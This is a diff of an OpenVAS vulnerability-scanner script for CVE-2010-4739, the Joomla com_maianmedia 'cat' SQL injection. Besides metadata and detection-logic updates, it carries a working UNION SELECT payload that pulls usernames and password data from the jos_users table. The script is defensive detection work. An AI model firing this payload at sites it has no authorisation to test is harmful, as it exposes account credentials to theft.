@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_joomla_maian_media_comp_sql_inj_vuln.nasl 11997 2018-10-20 11:59:41Z mmartin $
+# $Id: gb_joomla_maian_media_comp_sql_inj_vuln.nasl 12055 2018-10-24 12:00:58Z asteins $
 #
 # Joomla! com_maianmedia Component 'cat' Parameter SQL Injection Vulnerability
 #
@@ -27,15 +27,14 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.800199");
-  script_version("$Revision: 11997 $");
-  script_tag(name:"last_modification", value:"$Date: 2018-10-20 13:59:41 +0200 (Sat, 20 Oct 2018) $");
+  script_version("$Revision: 12055 $");
+  script_tag(name:"last_modification", value:"$Date: 2018-10-24 14:00:58 +0200 (Wed, 24 Oct 2018) $");
   script_tag(name:"creation_date", value:"2011-02-17 16:08:28 +0100 (Thu, 17 Feb 2011)");
   script_cve_id("CVE-2010-4739");
   script_bugtraq_id(44877);
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
   script_name("Joomla! com_maianmedia Component 'cat' Parameter SQL Injection Vulnerability");
-
 
   script_tag(name:"qod_type", value:"remote_vul");
   script_category(ACT_ATTACK);
@@ -62,19 +61,17 @@ if(description)
   exit(0);
 }
 
+CPE = "cpe:/a:joomla:joomla";
 
 include("http_func.inc");
 include("version_func.inc");
 include("http_keepalive.inc");
+include("host_details.inc");
 
-port = get_http_port(default:80);
-if(!port){
-  exit(0);
-}
+if(!port = get_app_port(cpe:CPE)) exit(0);
+if(!dir = get_app_location(cpe:CPE, port:port)) exit(0);
 
-if(!dir = get_dir_from_kb(port:port,app:"joomla")) {
-  exit(0);
-}
+if(dir == "/") dir = "";
 
 url = string(dir, "/index.php?option=com_maianmedia&view=music&cat=" +
                   "-9999+union+all+select+1,2,group_concat(name,char" +
@@ -82,6 +79,10 @@ url = string(dir, "/index.php?option=com_maianmedia&view=music&cat=" +
                   ",4,5,6,7,8,9,10,11,12,13,14,15,16,17+from+jos_users--");
 
 if(http_vuln_check(port:port, url:url, pattern:'Administrator:admin:' +
-                   'Super Administrator:', check_header: TRUE)){
-  security_message(port);
+                   'Super Administrator:', check_header:TRUE)) {
+  report = report_vuln_url(port:port, url:url);
+  security_message(port:port, data:report);
+  exit(0);
 }
+
+exit(99);
